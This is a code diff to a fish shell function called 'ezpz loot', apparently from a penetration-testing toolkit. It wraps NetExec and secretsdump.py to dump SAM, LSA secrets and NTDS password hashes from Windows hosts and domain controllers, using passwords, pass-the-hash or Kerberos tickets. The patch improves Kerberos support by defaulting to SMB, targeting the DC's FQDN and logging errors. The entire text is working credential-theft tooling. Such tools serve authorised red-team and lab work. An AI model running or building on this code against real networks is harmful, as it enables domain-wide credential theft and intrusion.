@@ -21,8 +21,12 @@ Options:
   -p, --password <pass>     Password for authentication
   -H, --hash <hash>         NTLM hash for pass-the-hash
   -k, --kerberos            Use Kerberos authentication
-  -x, --protocol <proto>    Protocol to use (smb/winrm, default: winrm)
+  -x, --protocol <proto>    Protocol (smb/winrm; default: smb with -k, winrm otherwise)
   -h, --help                Show this help message
+
+  Kerberos notes:
+    With -k, WinRM needs a TGT in the ccache. A CIFS-only service ticket
+    works with SMB, so -k defaults to SMB. Use -x winrm to force WinRM.
 
 Examples:
   ezpz loot -t 192.168.1.10 -u administrator -H hash -d corp.local
@@ -54,10 +58,17 @@ Examples:
     end
     
     set -l target $_flag_target
+    set -l dc_ip (ezpz_dc_ip $target)
+    test -n "$dc_ip"; or set dc_ip $target
+    set -l dc_fqdn (ezpz_dc_fqdn $target)
+    test -n "$dc_fqdn"; or set dc_fqdn $target
+
     set -l protocol winrm
-    
     if set -q _flag_protocol
         set protocol $_flag_protocol
+    else if set -q _flag_kerberos
+        set protocol smb
+        ezpz_info "Kerberos selected; defaulting to SMB (use -x winrm to force WinRM)."
     end
     
     if not contains $protocol smb winrm
@@ -102,6 +113,24 @@ Examples:
         set user (string split '\\' $user)[2]
     end
 
+    # Kerberos uses the DC FQDN for SPNs and validates the ccache first.
+    set -l nxc_target $target
+    if set -q _flag_kerberos; and test -n "$dc_fqdn"
+        set nxc_target $dc_fqdn
+    end
+
+    if set -q _flag_kerberos
+        ezpz_kerberos_check $protocol; or return 1
+
+        set -l auth_probe (nxc $protocol $nxc_target $auth_args 2>&1)
+        if not string match -qr '\[\+\]' -- $auth_probe
+            ezpz_error "Kerberos authentication failed for $nxc_target ($protocol)."
+            printf '%s\n' $auth_probe | grep -aE '\[-\]|ERROR|error' | tail -5
+            ezpz_warn "If the ccache only has a CIFS service ticket, use -x smb or get a TGT."
+            return 1
+        end
+    end
+
     # Prerequisites check
     for tool in nxc secretsdump.py
         if not command -v $tool >/dev/null 2>&1
@@ -137,7 +166,7 @@ Examples:
     end
 
     # Build authentication arguments for nxc
-    set -l nxc_args $target $auth_args
+    set -l nxc_args $nxc_target $auth_args
 
     # Determine PowerShell wrapper for SMB
     set pwsh_wrapper ""
@@ -209,30 +238,38 @@ Examples:
 
     ezpz_info "Running secretsdump.py to extract hashes..."
 
-    # Build secretsdump command arguments
-    set -l secretsdump_cmd_args
-    set -l target_auth_string ""
+    # Build secretsdump.py target: domain/user[:pass]@host
+    set -l sd_user $_flag_username
+    if string match -q "*\\*" $sd_user
+        set sd_user (string split '\\' $sd_user)[2]
+    end
 
-    # Construct authentication string
-    set target_auth_string "$_flag_username"
+    set -l sd_host $target
+    if set -q _flag_kerberos
+        set sd_host $dc_fqdn
+    end
+
+    set -l sd_target "$_flag_domain/$sd_user"
     if set -q _flag_password
-        set target_auth_string "$target_auth_string:$_flag_password"
+        set sd_target "$sd_target:$_flag_password"
     end
-    set target_auth_string "$target_auth_string@$target"
+    set sd_target "$sd_target@$sd_host"
 
-    set secretsdump_cmd_args $target_auth_string
+    set -l secretsdump_cmd_args $sd_target
 
-    # Add authentication flags
     if set -q _flag_hash
-        set secretsdump_cmd_args $secretsdump_cmd_args "-hashes" ":$_flag_hash"
+        set -a secretsdump_cmd_args -hashes ":$_flag_hash"
     else if set -q _flag_kerberos
-        set secretsdump_cmd_args $secretsdump_cmd_args "-k" "-no-pass"
+        set -a secretsdump_cmd_args -k -no-pass
     end
 
-    set secretsdump_cmd_args $secretsdump_cmd_args "-outputfile" "$secretsdump_output_base"
+    set -a secretsdump_cmd_args -dc-ip "$dc_ip"
+    set -a secretsdump_cmd_args -outputfile "$secretsdump_output_base"
 
     ezpz_cmd "secretsdump.py $secretsdump_cmd_args"
-    secretsdump.py $secretsdump_cmd_args >/dev/null 2>&1
+    set -l secretsdump_log (mktemp)
+    secretsdump.py $secretsdump_cmd_args > $secretsdump_log 2>&1
+    set -l secretsdump_status $status
 
     # Track if any secretsdump output files were produced
     set secretsdump_output_found 0
@@ -278,7 +315,12 @@ Examples:
 
     else
         ezpz_error "secretsdump.py did not produce any .sam/.secrets/.ntds files for $target. Check authentication or logs."
+        if test $secretsdump_status -ne 0
+            ezpz_warn "secretsdump.py exited with status $secretsdump_status."
+        end
+        grep -aE '\[-\]|ERROR|error|Kerberos' $secretsdump_log | tail -10
     end
+    rm -f $secretsdump_log
 
     echo ""
 
